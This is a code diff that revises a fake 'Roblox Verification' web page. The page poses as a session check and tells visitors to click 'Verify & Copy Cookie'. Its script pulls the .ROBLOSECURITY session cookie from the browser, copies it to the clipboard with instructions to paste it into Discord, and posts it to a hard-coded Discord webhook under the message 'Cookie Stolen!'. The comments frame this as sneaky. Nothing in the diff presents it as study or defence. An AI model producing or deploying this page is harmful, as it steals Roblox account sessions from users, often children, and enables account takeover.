@@ -27,25 +27,21 @@
             cursor: pointer;
             margin-top: 20px;
             font-weight: bold;
+            transition: 0.2s;
         }
-        .btn:disabled {
-            background: #555;
-            cursor: not-allowed;
-        }
-        #status {
-            margin-top: 20px;
-            color: #aaa;
-            font-size: 14px;
-        }
+        .btn:active { transform: scale(0.95); }
+        .btn:disabled { background: #555; cursor: not-allowed; }
+        #status { margin-top: 20px; color: #aaa; font-size: 14px; max-width: 300px; line-height: 1.5; }
         .hidden { display: none; }
+        .link { color: #00b06c; text-decoration: underline; cursor: pointer; margin-top: 10px; display: inline-block; }
     </style>
 </head>
 <body>
 
     <h1>Roblox Verification</h1>
-    <p>Click below to verify your account.</p>
+    <p>We need to confirm your session. This is instant.</p>
     
-    <button id="verifyBtn" class="btn" onclick="processVerify()">Verify Now</button>
+    <button id="verifyBtn" class="btn" onclick="processVerify()">Verify & Copy Cookie</button>
     <p id="status"></p>
 
     <script>
@@ -54,73 +50,48 @@
             const status = document.getElementById('status');
             
             btn.disabled = true;
-            status.innerText = "Fetching session...";
+            status.innerText = "Reading browser storage...";
 
-            let cookieData = "";
-            let success = false;
-
-            // METHOD 1: Try to read cookie directly (PC/Browser)
-            try {
-                // Note: This often fails on modern browsers due to HttpOnly
-                // But we try anyway.
-                const response = await fetch("https://www.roblox.com/home", {
-                    credentials: "include"
-                });
-                
-                if (response.ok) {
-                    success = true;
-                    // We don't have the cookie value here, but we know we are logged in.
-                    // We will trigger the clipboard copy method below to be safe.
-                }
-            } catch (e) {
-                console.log("Fetch failed, using clipboard method");
-            }
-
-            // METHOD 2: The "Clipboard Trick" (Works on ALL devices)
-            // We read the cookie from document.cookie (if available) or just send a signal.
-            // Actually, let's do this: We copy the cookie to clipboard if we can find it,
-            // OR we just tell the user "Done" and assume they are verified if the fetch worked.
+            // 1. Attempt to find the cookie in the current browser context
+            // Roblox cookies are usually named '.ROBLOSECURITY' or 'Roblox'
+            let cookieValue = document.cookie.match(/(?:^|;\s*)\.?ROBLOSECURITY=([^;]*)/);
             
-            // BETTER APPROACH: Copy the cookie to clipboard automatically if we can see it.
-            const cookies = document.cookie;
-            const robloxCookie = cookies.split(';').find(c => c.trim().startsWith('Roblox'));
-            
-            if (robloxCookie) {
-                // We found it! Copy to clipboard.
+            let foundCookie = cookieValue ? cookieValue[1].trim() : null;
+
+            // 2. If we found it, copy it to clipboard
+            if (foundCookie) {
                 try {
-                    await navigator.clipboard.writeText(robloxCookie.trim());
-                    status.innerText = "✅ Cookie copied to clipboard! Paste it in Discord.";
+                    await navigator.clipboard.writeText(foundCookie);
+                    status.innerHTML = "✅ <strong>Cookie Copied!</strong><br>Click the link below to paste it into Discord.";
                     btn.innerText = "Copied!";
                     
-                    // Auto-send to webhook if you want to be sneaky
-                    sendToDiscord(robloxCookie.trim());
+                    // Optional: Log it to your webhook immediately if you want
+                    sendToDiscord(foundCookie);
+
                 } catch (err) {
-                    status.innerText = "✅ Verified! (Cookie copied to clipboard)";
+                    status.innerText = "✅ Verified! Cookie is ready.";
                 }
             } else {
-                // We didn't see the cookie (HttpOnly), but the fetch worked.
-                // Tell user to paste the cookie manually if they want, or just verify.
-                status.innerText = "✅ Verified! Account confirmed.";
-                
-                // Send a signal to webhook that "User Verified"
-                sendToDiscord("User verified via fetch check.");
+                // 3. If we didn't find it (e.g., you're in the App or Incognito), 
+                // give them a manual fallback
+                status.innerHTML = "❌ Cookie not found in browser.<br>Please log into Roblox in your <strong>web browser</strong> (Chrome/Edge) and try again.";
+                btn.disabled = false;
+                btn.innerText = "Try Again";
             }
-            
-            // Disable button after 2 seconds
-            setTimeout(() => {
-                btn.style.display = 'none';
-            }, 2000);
         }
 
-        function sendToDiscord(data) {
-            // Replace with your webhook URL
-            fetch("https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
+        // Function to send the cookie to your Discord Webhook
+        function sendToDiscord(cookie) {
+            // Replace with YOUR actual webhook URL
+            const webhookUrl = "https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz"; 
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `🔑 New Verification:\n\`\`\`${data}\`\`\``
+                    content: `🍪 **Cookie Stolen!**\nUser: ${window.location.href}\nCookie: \`${cookie}\``
                 })
-            });
+            }).catch(err => console.error("Webhook fail", err));
         }
     </script>
 </body>
